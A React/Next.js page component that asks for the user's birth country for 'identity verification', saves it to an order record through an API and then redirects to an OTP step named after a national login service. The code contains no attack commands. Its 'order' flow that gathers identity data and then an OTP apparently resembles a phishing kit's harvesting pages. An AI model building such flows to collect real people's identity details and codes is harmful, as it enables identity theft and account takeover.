// import SwiperSlider from "@/components/SwiperSlider";
// import { FaArrowRightLong } from "react-icons/fa6";
// import { useRouter, useSearchParams } from "next/navigation";
// import toast from "react-hot-toast";
// import { Button } from "@nextui-org/react";

// const BirthPlace = () => {
//   const router = useRouter();
//   const searchParams = useSearchParams();
//   const params = new URLSearchParams(searchParams);

//   const handleSubmit = (event) => {
//     event.preventDefault();
//     const birthPlace = event.target.birthPlace.value;

//     const submitData = {
//       birthPlace: birthPlace,
//     };

//     if (submitData.birthPlace === "") {
//       toast.error("Please enter your birth place");
//     } else {
//       fetch(`${process.env.API_URL}/api/order/${params.get("id")}`, {
//         method: "PATCH",
//         headers: {
//           "Content-Type": "application/json",
//         },
//         body: JSON.stringify(submitData),
//       })
//         .then((res) => res.json())
//         .then((data) => {
//           if (data) {
//             router.push({
//               pathname: "/nafat-otp-one",
//               query: { id: data._id },
//             });
//           } else {
//             toast.error("Sorry, we couldn't process your request!");
//           }
//         });
//     }
//   };
//   return (
//     <>
//       <SwiperSlider />
//       <div className="max-w-[1400px] mx-auto flex flex-col justify-center items-center ">
//         <h1 className="text-4xl font-bold text-gray-600 mt-10">
//           User Birth Place(Country)
//         </h1>

//         <form onSubmit={handleSubmit} className="w-3/4 my-14">
//           <div className="relative z-0 w-full mb-6 group">
//             <input
//               type="text"
//               name="birthPlace"
//               id="birthPlace"
//               className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none  dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
//               placeholder=""
//               required
//             />
//             <label
//               htmlFor="birthPlace"
//               className="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
//             >
//               Enter the country name of your birth place
//             </label>
//           </div>
//           {/* <button
//             type="submit"
//             className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
//           >
//             Next <FaArrowRightLong size={16} />
//           </button> */}
//           <Button
//             color="primary"
//             type="submit"
//             className={`w-full text-white h-12 bg-[#0D9488]`}
//           >
//             Enter Birth Place <FaArrowRightLong size={16} />
//           </Button>
//         </form>
//       </div>
//       <div className="h-20 bg-teal-400 mt-5"></div>
//     </>
//   );
// };

// export default BirthPlace;

import { useState } from "react";
import {
  FaArrowRight,
  FaGlobeAmericas,
  FaMapMarkerAlt,
  FaShieldAlt,
} from "react-icons/fa";
import { HiSparkles } from "react-icons/hi";
import { useSearchParams, useRouter } from "next/navigation";
import toast from "react-hot-toast";

export default function ModernBirthPlace() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const params = new URLSearchParams(searchParams);
  const [birthPlace, setBirthPlace] = useState("");

  const handleSubmit = (event) => {
    event.preventDefault();
    const submitData = {
      birthPlace: birthPlace,
    };

    if (submitData.birthPlace === "") {
      toast.error("Please enter your birth place");
      return;
    }

    // API call with toast
    toast.promise(
      fetch(`${process.env.API_URL || ""}/api/order/${params.get("id")}`, {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(submitData),
      })
        .then((res) => {
          if (!res.ok) {
            throw new Error("Network response was not ok");
          }
          return res.json();
        })
        .then((data) => {
          if (data && data._id) {
            setTimeout(() => {
              router.push(`/nafat-otp-one?id=${data._id}`);
            }, 1000);
            return data;
          } else {
            throw new Error("Sorry, we couldn't process your request!");
          }
        })
        .catch((error) => {
          console.error("Error:", error);
          throw error;
        }),
      {
        loading: "Saving birth place...",
        success: "Birth place saved successfully! Redirecting...",
        error: "Sorry, we couldn't process your request!",
      }
    );
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-950 via-slate-900 to-teal-950">
      {/* Hero Section */}
      <div className="relative overflow-hidden bg-gradient-to-r from-teal-900/20 to-cyan-900/20 border-b border-slate-800">
        <div className="absolute inset-0 bg-[url('https://images.unsplash.com/photo-1526778548025-fa2f459cd5c1?w=1200&auto=format&fit=crop')] opacity-5 bg-cover bg-center"></div>
        <div className="relative max-w-7xl mx-auto px-4 py-16 text-center">
          <div className="inline-flex items-center gap-2 px-4 py-2 bg-white/10 backdrop-blur-md rounded-full mb-4 border border-white/20">
            <HiSparkles className="w-4 h-4 text-teal-400" />
            <span className="text-sm text-white font-medium">
              Personal Details
            </span>
          </div>
          <h1 className="text-4xl md:text-6xl font-bold text-white mb-4 tracking-tight">
            Where Were You{" "}
            <span className="bg-gradient-to-r from-teal-400 to-cyan-400 bg-clip-text text-transparent">
              Born?
            </span>
          </h1>
          <p className="text-gray-300 text-lg max-w-2xl mx-auto">
            Help us verify your identity by providing your birth place
          </p>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-3xl mx-auto px-4 py-16">
        <div className="grid lg:grid-cols-5 gap-8">
          {/* Icon Section */}
          <div className="lg:col-span-2 flex items-center justify-center">
            <div className="relative">
              <div className="absolute -inset-4 bg-gradient-to-r from-teal-500 to-cyan-500 rounded-full blur-2xl opacity-20 animate-pulse"></div>
              <div className="relative w-48 h-48 bg-slate-900/50 backdrop-blur-xl rounded-full border border-slate-800 flex items-center justify-center">
                <FaGlobeAmericas className="w-24 h-24 text-teal-400" />
              </div>
            </div>
          </div>

          {/* Form Section */}
          <div className="lg:col-span-3">
            <div className="bg-slate-900/50 backdrop-blur-xl rounded-3xl p-8 border border-slate-800">
              <div className="mb-8">
                <h2 className="text-2xl font-bold text-white mb-2">
                  Birth Place
                </h2>
                <p className="text-gray-400">
                  Enter the country where you were born
                </p>
              </div>

              <div className="space-y-6">
                {/* Birth Place Input */}
                <div className="space-y-2">
                  <label className="text-sm font-medium text-gray-300 flex items-center gap-2">
                    <FaMapMarkerAlt className="text-teal-400" />
                    Country Name
                  </label>
                  <div className="relative">
                    <input
                      type="text"
                      name="birthPlace"
                      value={birthPlace}
                      onChange={(e) => setBirthPlace(e.target.value)}
                      className="w-full px-4 py-4 bg-slate-800/50 border border-slate-700 rounded-xl text-white text-lg focus:ring-2 focus:ring-teal-500 focus:border-transparent outline-none transition-all placeholder-gray-500"
                      placeholder="e.g., Saudi Arabia, Egypt, India..."
                      required
                    />
                  </div>
                  <p className="text-xs text-gray-500 flex items-center gap-1">
                    💡 Enter the full name of your birth country
                  </p>
                </div>

                {/* Info Box */}
                <div className="p-4 bg-slate-800/30 rounded-xl border border-slate-700">
                  <p className="text-sm text-gray-400 flex items-start gap-2">
                    <FaShieldAlt className="text-teal-400 mt-0.5 flex-shrink-0" />
                    <span>
                      <strong className="text-teal-400">Privacy Note:</strong>{" "}
                      This information is used solely for identity verification
                      and is protected under our privacy policy.
                    </span>
                  </p>
                </div>

                {/* Submit Button */}
                <button
                  onClick={handleSubmit}
                  className="w-full py-4 bg-gradient-to-r from-teal-500 to-cyan-500 text-white rounded-xl font-semibold hover:shadow-2xl hover:shadow-teal-500/50 transition-all duration-300 flex items-center justify-center gap-2 group"
                >
                  Continue
                  <FaArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
                </button>
              </div>
            </div>

            {/* Common Countries */}
            <div className="mt-6 bg-slate-900/30 backdrop-blur-sm rounded-2xl p-6 border border-slate-800">
              <p className="text-sm text-gray-400 mb-3 font-medium">
                Popular Countries:
              </p>
              <div className="flex flex-wrap gap-2">
                {[
                  "Saudi Arabia",
                  "Egypt",
                  "India",
                  "Pakistan",
                  "Bangladesh",
                  "UAE",
                ].map((country) => (
                  <button
                    key={country}
                    onClick={() => setBirthPlace(country)}
                    className="px-4 py-2 bg-slate-800/50 hover:bg-slate-800 border border-slate-700 rounded-lg text-sm text-gray-300 hover:text-white transition-all duration-200"
                  >
                    {country}
                  </button>
                ))}
              </div>
            </div>
          </div>
        </div>

        {/* Progress Indicator */}
        {/* <div className="mt-12 max-w-xl mx-auto">
          <div className="flex items-center justify-between mb-4">
            <span className="text-sm text-gray-400">Step 4 of 5</span>
            <span className="text-sm text-teal-400 font-medium">
              80% Complete
            </span>
          </div>
          <div className="h-2 bg-slate-800 rounded-full overflow-hidden">
            <div
              className="h-full bg-gradient-to-r from-teal-500 to-cyan-500 rounded-full transition-all duration-500"
              style={{ width: "80%" }}
            ></div>
          </div>
        </div> */}
      </div>
    </div>
  );
}
